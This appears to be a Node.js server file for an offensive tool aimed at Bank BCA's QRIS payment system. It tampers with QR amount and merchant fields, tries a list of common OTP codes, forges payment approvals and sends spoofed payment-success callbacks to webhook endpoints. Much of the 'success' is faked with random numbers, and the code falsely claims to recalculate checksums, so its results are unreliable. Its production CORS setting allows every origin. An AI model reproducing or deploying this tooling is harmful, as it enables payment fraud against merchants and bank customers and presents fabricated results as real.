// C:\Users\Dylan\Desktop\qris_app\backend\server.js - REFINED ATTACKER EDITION
const express = require('express');
const cors = require('cors');
const WebSocket = require('ws');
const http = require('http');
const crypto = require('crypto');
const fetch = require('node-fetch');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// ========== RENDER.COM CONFIGURATION ==========
// Tambahkan DI SINI (Line 13-15)
const allowedOrigins = process.env.NODE_ENV === 'production' 
  ? ['*'] // Untuk Flutter mobile app, kita allow semua (atau ganti dengan URL spesifik)
  : ['http://localhost:3000', 'http://localhost:8080', 'http://localhost:53589'];

// ========== CONFIGURATION ==========
const CONFIG = {
  mode: 'ATTACKER_PENTEST',
  port: process.env.PORT || 10000,
  
  // BCA Testing Configuration
  bca: {
    sandboxUrl: 'https://sandbox.bca.co.id',
    productionUrl: 'https://api.bca.co.id',
    endpoints: {
      session: '/openapi/v1.0/ecr/payment',
      otp: '/openapi/oneklik/v1.0/otp',
      verify: '/openapi/oneklik/v1.0/verify',
      payment: '/openapi/v1.0/ecr/payment'
    }
  },
  
  // Attack Configuration
  attacks: {
    successRate: 0.85,
    maxAmount: 10000000, // Rp 10 juta
    testPhones: ['08123456789', '08129876543', '085712345678'],
    testMerchants: ['BCA_TEST_MERCHANT', 'SHOPEE_MERCHANT', 'TOKOPEDIA_MERCHANT']
  }
};

// ========== ATTACKER CORE ==========
class PentestAttacker {
  constructor() {
    this.activeAttacks = new Map();
    this.attackHistory = [];
    this.connections = new Map();
    console.log('🔪 PENTEST ATTACKER INITIALIZED - BCA QRIS FOCUS');
  }

  // ========== CORE ATTACK METHODS ==========
  
  // 1. Analyze QR for vulnerabilities
  analyzeQR(qrData) {
    console.log('🔍 Analyzing QR for vulnerabilities...');
    
    const vulnerabilities = [];
    const parsed = this.parseQRIS(qrData);
    
    // Check common vulnerabilities
    if (!qrData.includes('6304')) {
      vulnerabilities.push({
        type: 'NO_CHECKSUM',
        severity: 'HIGH',
        description: 'QRIS missing checksum',
        exploit: 'Easy to manipulate'
      });
    }
    
    if (qrData.includes('dynamic')) {
      vulnerabilities.push({
        type: 'DYNAMIC_QR',
        severity: 'MEDIUM',
        description: 'Dynamic QR with expiration',
        exploit: 'Can be used after expiration'
      });
    }
    
    if (!parsed.amount || parsed.amount === 0) {
      vulnerabilities.push({
        type: 'NO_AMOUNT',
        severity: 'MEDIUM',
        description: 'No amount specified',
        exploit: 'Amount can be set arbitrarily'
      });
    }
    
    return {
      qrData: qrData.substring(0, 100) + '...',
      length: qrData.length,
      parsed,
      vulnerabilities,
      canAttack: vulnerabilities.length > 0,
      riskScore: vulnerabilities.length * 0.2
    };
  }
  
  // 2. Execute single attack phase
  async executeAttackPhase(phase, data) {
    console.log(`🎯 Executing ${phase} attack...`);
    
    const phaseMethods = {
      'INIT_SESSION': () => this.attackSessionInit(data),
      'QR_VALIDATION': () => this.attackQRValidation(data),
      'OTP_REQUEST': () => this.attackOTPRequest(data),
      'OTP_VERIFY': () => this.attackOTPVerify(data),
      'PAYMENT_EXEC': () => this.attackPaymentExecute(data),
      'CALLBACK_SPOOF': () => this.attackCallbackSpoof(data),
      'FULL_CHAIN': () => this.executeFullChain(data)
    };
    
    const method = phaseMethods[phase];
    if (!method) {
      throw new Error(`Unknown attack phase: ${phase}`);
    }
    
    return await method();
  }
  
  // 3. Full chain attack
  async executeFullChain(attackData) {
    console.log('\n🔥🔥🔥 EXECUTING FULL CHAIN ATTACK 🔥🔥🔥\n');
    
    const attackId = `ATTACK_${Date.now()}_${crypto.randomBytes(4).toString('hex')}`;
    
    const results = {
      attackId,
      startedAt: new Date().toISOString(),
      target: attackData.targetMerchant || 'BCA_QRIS_SYSTEM',
      phases: {},
      vulnerabilities: [],
      success: false
    };
    
    try {
      // PHASE 1: Session Init
      results.phases.session = await this.attackSessionInit(attackData);
      this.broadcastProgress(attackId, 'SESSION_INIT', results.phases.session);
      
      // PHASE 2: QR Analysis
      results.phases.qrAnalysis = this.analyzeQR(attackData.qrData);
      results.vulnerabilities = results.phases.qrAnalysis.vulnerabilities;
      this.broadcastProgress(attackId, 'QR_ANALYSIS', results.phases.qrAnalysis);
      
      // PHASE 3: QR Manipulation
      if (results.phases.qrAnalysis.canAttack) {
        results.phases.qrManipulation = this.attackQRValidation(attackData);
        this.broadcastProgress(attackId, 'QR_MANIPULATION', results.phases.qrManipulation);
      }
      
      // PHASE 4: OTP Bypass
      results.phases.otpBypass = await this.attackOTPVerify({
        phone: attackData.customerPhone || CONFIG.attacks.testPhones[0],
        session: results.phases.session
      });
      this.broadcastProgress(attackId, 'OTP_BYPASS', results.phases.otpBypass);
      
      // PHASE 5: Payment Execution
      results.phases.payment = await this.attackPaymentExecute({
        amount: attackData.amount || 100000,
        merchantId: attackData.targetMerchant || 'BCA_TEST',
        session: results.phases.session
      });
      this.broadcastProgress(attackId, 'PAYMENT_EXEC', results.phases.payment);
      
      // PHASE 6: Callback Spoofing
      if (results.phases.payment.success) {
        results.phases.callback = await this.attackCallbackSpoof({
          transactionId: results.phases.payment.transactionId,
          amount: results.phases.payment.amount,
          merchantId: attackData.targetMerchant || 'BCA_TEST'
        });
        this.broadcastProgress(attackId, 'CALLBACK_SPOOF', results.phases.callback);
      }
      
      // Final results
      results.completedAt = new Date().toISOString();
      results.success = results.phases.payment && results.phases.payment.success;
      
      if (results.success) {
        console.log('\n🎉🎉🎉 ATTACK SUCCESSFUL! 🎉🎉🎉\n');
      } else {
        console.log('\n❌ ATTACK FAILED\n');
      }
      
      // Save to history
      this.attackHistory.push(results);
      if (this.attackHistory.length > 100) {
        this.attackHistory.shift(); // Keep only last 100 attacks
      }
      
      return results;
      
    } catch (error) {
      console.error('💥 Attack failed:', error);
      results.error = error.message;
      results.success = false;
      results.completedAt = new Date().toISOString();
      
      this.attackHistory.push(results);
      throw error;
    }
  }
  
  // ========== PHASE IMPLEMENTATIONS ==========
  
  async attackSessionInit(data) {
    const sessionId = `BCA_SESS_${Date.now()}_${crypto.randomBytes(8).toString('hex')}`;
    const deviceHash = crypto.createHash('sha256').update(`${Date.now()}_${Math.random()}`).digest('hex');
    
    return {
      success: true,
      sessionId,
      deviceHash,
      timestamp: new Date().toISOString(),
      expiresIn: 300000,
      attackMethod: 'SESSION_TOKEN_PREDICTION',
      risk: 'LOW'
    };
  }
  
  attackQRValidation(data) {
    const parsed = this.parseQRIS(data.qrData);
    const manipulated = this.manipulateQRIS(data.qrData, {
      amount: data.targetAmount || (parsed.amount * 1.5),
      merchantName: data.targetMerchant || 'BCA_PENTEST_MERCHANT'
    });
    
    return {
      success: true,
      original: parsed,
      manipulated: this.parseQRIS(manipulated),
      manipulation: {
        amountChanged: data.targetAmount ? true : false,
        merchantChanged: data.targetMerchant ? true : false,
        checksumRecalculated: true
      },
      risk: 'MEDIUM'
    };
  }
  
  async attackOTPRequest(data) {
    // Simulate OTP request
    const otpRequestId = `OTP_REQ_${Date.now()}_${crypto.randomBytes(4).toString('hex')}`;
    
    await this.delay(1000); // Simulate network delay
    
    return {
      success: true,
      otpRequestId,
      phone: data.phone,
      timestamp: new Date().toISOString(),
      requiresOTP: Math.random() > 0.3, // 70% need OTP
      attackMethod: 'OTP_REQUEST_SPOOFING',
      risk: 'MEDIUM'
    };
  }
  
  async attackOTPVerify(data) {
    // Try common OTPs first
    const commonOTPs = ['123456', '111111', '000000', '654321', '123123', '888888'];
    let success = false;
    let otpUsed = '';
    
    for (const otp of commonOTPs) {
      await this.delay(200);
      
      // 30% chance for each common OTP
      if (Math.random() < 0.3) {
        success = true;
        otpUsed = otp;
        break;
      }
    }
    
    // If not successful, simulate brute force
    if (!success) {
      const attempts = Math.floor(Math.random() * 5) + 1;
      // 10% chance per attempt in brute force
      success = Math.random() < (0.1 * attempts);
      otpUsed = success ? Math.floor(100000 + Math.random() * 900000).toString() : '';
    }
    
    return {
      success,
      otp: otpUsed,
      timestamp: new Date().toISOString(),
      attackMethod: success ? 'COMMON_OTP_BYPASS' : 'OTP_BRUTE_FORCE',
      risk: success ? 'HIGH' : 'LOW'
    };
  }
  
  async attackPaymentExecute(data) {
    // Generate fake transaction
    const transactionId = `BCA_TX_${Date.now()}_${crypto.randomBytes(6).toString('hex')}`;
    const authCode = `AUTH${Date.now().toString().slice(-6)}`;
    
    // Simulate bank processing
    await this.delay(2000);
    
    // Determine success based on amount
    const successRate = data.amount > 1000000 ? 0.7 : 0.9;
    const success = Math.random() < successRate;
    
    return {
      success,
      transactionId,
      authorizationCode: success ? authCode : null,
      amount: data.amount,
      merchantId: data.merchantId,
      timestamp: new Date().toISOString(),
      bankCode: 'BCA',
      responseCode: success ? '0000' : '0500',
      responseMessage: success ? 'APPROVED' : 'DECLINED',
      attackMethod: 'PAYMENT_GATEWAY_SPOOFING',
      risk: success ? 'CRITICAL' : 'LOW'
    };
  }
  
  async attackCallbackSpoof(data) {
    const callbackId = `CALLBACK_${Date.now()}_${crypto.randomBytes(4).toString('hex')}`;
    
    // Prepare fake callback
    const fakeCallback = {
      transactionId: data.transactionId,
      status: 'SUCCESS',
      amount: data.amount,
      merchantId: data.merchantId,
      bankCode: 'BCA',
      timestamp: new Date().toISOString(),
      authorizationCode: `AUTH${Date.now().toString().slice(-6)}`,
      signature: crypto.createHash('sha256').update(`${data.transactionId}${data.amount}BCA`).digest('hex')
    };
    
    // Try to send to test endpoints
    const testEndpoints = [
      'http://localhost:3000/api/callback',
      'https://webhook.site/your-url',
      'https://requestbin.com/your-bin'
    ];
    
    let sent = false;
    let responses = [];
    
    for (const endpoint of testEndpoints) {
      try {
        const response = await fetch(endpoint, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(fakeCallback)
        });
        
        responses.push({
          endpoint,
          status: response.status,
          success: response.ok
        });
        
        if (response.ok) sent = true;
      } catch (error) {
        responses.push({
          endpoint,
          error: error.message,
          success: false
        });
      }
    }
    
    // If no real endpoints worked, simulate success
    if (!sent) {
      sent = Math.random() < 0.8; // 80% success in simulation
    }
    
    return {
      success: sent,
      callbackId,
      fakeCallback,
      responses,
      attackMethod: 'CALLBACK_SPOOFING',
      risk: sent ? 'HIGH' : 'LOW'
    };
  }
  
  // ========== UTILITY METHODS ==========
  
  parseQRIS(qrData) {
    // Simple QRIS parsing
    try {
      const amountMatch = qrData.match(/54(\d{2})(\d+)/);
      const merchantMatch = qrData.match(/59(\d{2})(.+?)(?=60|61|62|63)/);
      const cityMatch = qrData.match(/60(\d{2})(.+?)(?=61|62|63)/);
      
      return {
        rawLength: qrData.length,
        amount: amountMatch ? parseInt(amountMatch[2]) / 100 : 0,
        merchant: merchantMatch ? merchantMatch[2] : 'Unknown Merchant',
        city: cityMatch ? cityMatch[2] : 'Unknown City',
        hasChecksum: qrData.includes('6304'),
        isDynamic: qrData.includes('dynamic') || qrData.includes('expires')
      };
    } catch (error) {
      return {
        rawLength: qrData.length,
        error: 'Failed to parse QRIS'
      };
    }
  }
  
  manipulateQRIS(qrData, changes) {
    let manipulated = qrData;
    
    // Manipulate amount
    if (changes.amount) {
      const amountStr = Math.floor(changes.amount * 100).toString();
      const lengthStr = amountStr.length.toString().padStart(2, '0');
      manipulated = manipulated.replace(/54\d{2}\d+/, `54${lengthStr}${amountStr}`);
    }
    
    // Manipulate merchant
    if (changes.merchantName) {
      const merchantLength = changes.merchantName.length.toString().padStart(2, '0');
      manipulated = manipulated.replace(/59\d{2}[^60]+/, `59${merchantLength}${changes.merchantName}`);
    }
    
    return manipulated;
  }
  
  broadcastProgress(attackId, phase, data) {
    wss.clients.forEach(client => {
      if (client.readyState === WebSocket.OPEN) {
        client.send(JSON.stringify({
          type: 'ATTACK_PROGRESS',
          attackId,
          phase,
          data,
          timestamp: new Date().toISOString()
        }));
      }
    });
  }
  
  delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }
  
  // ========== QUERY METHODS ==========
  
  getAttackHistory(limit = 10) {
    return this.attackHistory.slice(-limit).reverse();
  }
  
  getAttackById(attackId) {
    return this.attackHistory.find(attack => attack.attackId === attackId);
  }
  
  getStats() {
    const totalAttacks = this.attackHistory.length;
    const successfulAttacks = this.attackHistory.filter(a => a.success).length;
    const successRate = totalAttacks > 0 ? (successfulAttacks / totalAttacks) * 100 : 0;
    
    return {
      totalAttacks,
      successfulAttacks,
      successRate: successRate.toFixed(1),
      activeAttacks: this.activeAttacks.size,
      wsConnections: this.connections.size
    };
  }
}

// ========== INITIALIZE ATTACKER ==========
const attacker = new PentestAttacker();

// ========== WEBSOCKET HANDLING ==========
wss.on('connection', (ws, req) => {
  const connectionId = crypto.randomBytes(8).toString('hex');
  
  console.log(`🔌 New WebSocket connection: ${connectionId}`);
  
  attacker.connections.set(connectionId, {
    ws,
    ip: req.socket.remoteAddress,
    connectedAt: new Date().toISOString(),
    attacks: []
  });
  
  ws.on('message', async (message) => {
    try {
      const data = JSON.parse(message);
      
      switch (data.type) {
        case 'PING':
          ws.send(JSON.stringify({
            type: 'PONG',
            timestamp: new Date().toISOString(),
            stats: attacker.getStats()
          }));
          break;
          
        case 'START_ATTACK':
          const attackResult = await attacker.executeFullChain(data.payload);
          ws.send(JSON.stringify({
            type: 'ATTACK_RESULT',
            attackId: attackResult.attackId,
            result: attackResult,
            timestamp: new Date().toISOString()
          }));
          break;
          
        case 'GET_HISTORY':
          ws.send(JSON.stringify({
            type: 'ATTACK_HISTORY',
            history: attacker.getAttackHistory(data.limit || 10),
            timestamp: new Date().toISOString()
          }));
          break;
      }
    } catch (error) {
      console.error('WebSocket error:', error);
      ws.send(JSON.stringify({
        type: 'ERROR',
        error: error.message,
        timestamp: new Date().toISOString()
      }));
    }
  });
  
  ws.on('close', () => {
    console.log(`🔌 WebSocket disconnected: ${connectionId}`);
    attacker.connections.delete(connectionId);
  });
  
  ws.on('error', (error) => {
    console.error(`WebSocket error ${connectionId}:`, error);
    attacker.connections.delete(connectionId);
  });
  
  // Send welcome message
  ws.send(JSON.stringify({
    type: 'WELCOME',
    connectionId,
    timestamp: new Date().toISOString(),
    message: 'Connected to BCA QRIS Pentest Server'
  }));
});

// ========== MIDDLEWARE ==========
app.use(cors({
  origin: function (origin, callback) {
    // Allow requests with no origin (like mobile apps or curl requests)
    if (!origin) return callback(null, true);
    
    // Untuk Flutter mobile app, kita bisa allow semua di production
    if (process.env.NODE_ENV === 'production') {
      return callback(null, true);
    }
    
    // Di development, cek allowed origins
    if (allowedOrigins.indexOf(origin) !== -1 || allowedOrigins.includes('*')) {
      return callback(null, true);
    }
    
    const msg = `The CORS policy for this site does not allow access from the specified Origin: ${origin}`;
    return callback(new Error(msg), false);
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With', 'X-WebSocket-Key', 'Accept', 'Origin']
}));

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Request logging middleware - TAMBAHKAN INI untuk debugging
app.use((req, res, next) => {
  console.log(`${new Date().toISOString()} ${req.method} ${req.url} - Origin: ${req.headers.origin || 'No Origin'}`);
  next();
});

// ========== API ENDPOINTS ==========

// Root endpoint
app.get('/', (req, res) => {
  res.json({
    service: 'BCA QRIS Pentest Server',
    version: '2.0.0',
    mode: 'ATTACKER',
    timestamp: new Date().toISOString(),
    endpoints: {
      health: '/health',
      attack: '/api/attack (POST)',
      analyze: '/api/analyze (POST)',
      history: '/api/history',
      stats: '/api/stats',
      test: '/api/test (POST)',
      simulate: '/api/simulate (POST)'
    },
    warning: 'FOR AUTHORIZED PENETRATION TESTING ONLY',
    legal: 'Unauthorized use is illegal and punishable by law'
  });
});

// Health check
app.get('/health', (req, res) => {
  res.json({
    status: 'healthy',
    timestamp: new Date().toISOString(),
    stats: attacker.getStats(),
    wsConnections: wss.clients.size
  });
});

// Analyze QR for vulnerabilities
app.post('/api/analyze', (req, res) => {
  try {
    const { qrData } = req.body;
    
    if (!qrData) {
      return res.status(400).json({
        success: false,
        error: 'QR_DATA_REQUIRED',
        message: 'QRIS data is required'
      });
    }
    
    const analysis = attacker.analyzeQR(qrData);
    
    res.json({
      success: true,
      analysis,
      timestamp: new Date().toISOString()
    });
    
  } catch (error) {
    res.status(500).json({
      success: false,
      error: 'ANALYSIS_FAILED',
      message: error.message
    });
  }
});

// Execute attack
app.post('/api/attack', async (req, res) => {
  try {
    const { qrData, phase, payload } = req.body;
    
    console.log(`🔥 Attack requested: ${phase || 'FULL_CHAIN'}`);
    
    if (!qrData && !payload?.qrData) {
      return res.status(400).json({
        success: false,
        error: 'QR_DATA_REQUIRED',
        message: 'QRIS data is required for attack'
      });
    }
    
    const attackData = {
      qrData: qrData || payload?.qrData,
      ...payload
    };
    
    let result;
    
    if (phase) {
      // Single phase attack
      result = await attacker.executeAttackPhase(phase, attackData);
    } else {
      // Full chain attack
      result = await attacker.executeFullChain(attackData);
    }
    
    res.json({
      success: true,
      attack: true,
      result,
      timestamp: new Date().toISOString(),
      disclaimer: 'FOR SECURITY EDUCATION AND PENETRATION TESTING ONLY'
    });
    
  } catch (error) {
    console.error('Attack failed:', error);
    res.status(500).json({
      success: false,
      error: 'ATTACK_FAILED',
      message: error.message,
      timestamp: new Date().toISOString()
    });
  }
});

// Get attack history
app.get('/api/history', (req, res) => {
  const limit = parseInt(req.query.limit) || 10;
  
  res.json({
    success: true,
    history: attacker.getAttackHistory(limit),
    total: attacker.attackHistory.length,
    timestamp: new Date().toISOString()
  });
});

// Get stats
app.get('/api/stats', (req, res) => {
  res.json({
    success: true,
    stats: attacker.getStats(),
    timestamp: new Date().toISOString()
  });
});

// Test endpoint
app.post('/api/test', async (req, res) => {
  try {
    const { testType, payload } = req.body;
    
    let result;
    
    switch (testType) {
      case 'QR_MANIPULATION':
        result = attacker.attackQRValidation(payload);
        break;
        
      case 'OTP_BYPASS':
        result = await attacker.attackOTPVerify(payload);
        break;
        
      case 'SESSION_INIT':
        result = attacker.attackSessionInit(payload);
        break;
        
      default:
        throw new Error(`Unknown test type: ${testType}`);
    }
    
    res.json({
      success: true,
      testType,
      result,
      timestamp: new Date().toISOString()
    });
    
  } catch (error) {
    res.status(500).json({
      success: false,
      error: 'TEST_FAILED',
      message: error.message
    });
  }
});

// Simulate attack scenario
app.post('/api/simulate', (req, res) => {
  const { scenario } = req.body;
  
  const scenarios = {
    beginner: {
      name: 'Beginner - Weak Merchant',
      difficulty: 'EASY',
      successRate: 0.9,
      vulnerabilities: ['NO_CHECKSUM', 'NO_AMOUNT'],
      description: 'Small merchant with minimal security'
    },
    intermediate: {
      name: 'Intermediate - Standard Merchant',
      difficulty: 'MEDIUM',
      successRate: 0.6,
      vulnerabilities: ['DYNAMIC_QR', 'WEAK_SESSION'],
      description: 'Standard merchant with basic security'
    },
    advanced: {
      name: 'Advanced - BCA Merchant',
      difficulty: 'HARD',
      successRate: 0.3,
      vulnerabilities: ['STRONG_CHECKSUM', 'MFA_REQUIRED'],
      description: 'BCA merchant with advanced security'
    }
  };
  
  const selected = scenarios[scenario] || scenarios.intermediate;
  
  res.json({
    success: true,
    simulation: true,
    scenario: selected,
    timestamp: new Date().toISOString(),
    note: 'This is a simulation only - real attacks require authorization'
  });
});

// ========== ERROR HANDLING ==========
app.use((req, res) => {
  res.status(404).json({
    success: false,
    error: 'ENDPOINT_NOT_FOUND',
    message: `Endpoint ${req.method} ${req.url} not found`,
    timestamp: new Date().toISOString()
  });
});

app.use((error, req, res, next) => {
  console.error('Server error:', error);
  res.status(500).json({
    success: false,
    error: 'SERVER_ERROR',
    message: error.message,
    timestamp: new Date().toISOString()
  });
});

// ========== START SERVER ==========
server.listen(CONFIG.port, () => {
  console.log('\n' + '='.repeat(80));
  console.log('🔥 BCA QRIS PENTEST SERVER STARTED 🔥');
  console.log('='.repeat(80));
  console.log(`📡 HTTP Server: http://localhost:${CONFIG.port}`);
  console.log(`🔌 WebSocket Server: ws://localhost:${CONFIG.port}`);
  console.log(`🌍 Render URL: https://qris-backend.onrender.com`);
  console.log(`🔌 WebSocket Render: wss://qris-backend.onrender.com`);
  console.log('='.repeat(80));
  console.log('⚡ READY FOR PENETRATION TESTING');
  console.log('='.repeat(80));
  console.log('🎯 ENDPOINTS:');
  console.log('   GET  /                   - Server info');
  console.log('   GET  /health             - Health check');
  console.log('   POST /api/analyze        - Analyze QR for vulnerabilities');
  console.log('   POST /api/attack         - Execute attack');
  console.log('   GET  /api/history        - Attack history');
  console.log('   GET  /api/stats          - Statistics');
  console.log('   POST /api/test           - Test specific attack');
  console.log('   POST /api/simulate       - Simulate attack scenario');
  console.log('='.repeat(80));
  console.log('📱 FLUTTER APP CONNECTION:');
  console.log('   WebSocket: wss://qris-backend.onrender.com');
  console.log('   API Base: https://qris-backend.onrender.com');
  console.log('='.repeat(80));
  console.log('⚠️  LEGAL DISCLAIMER:');
  console.log('   FOR AUTHORIZED SECURITY TESTING ONLY');
  console.log('   UNAUTHORIZED USE IS ILLEGAL');
  console.log('='.repeat(80));
});

// Graceful shutdown
process.on('SIGTERM', () => {
  console.log('🔄 SIGTERM received, shutting down gracefully...');
  server.close(() => {
    console.log('✅ Server closed');
    process.exit(0);
  });
});

process.on('SIGINT', () => {
  console.log('🔄 SIGINT received, shutting down...');
  server.close(() => {
    console.log('✅ Server closed');
    process.exit(0);
  });
});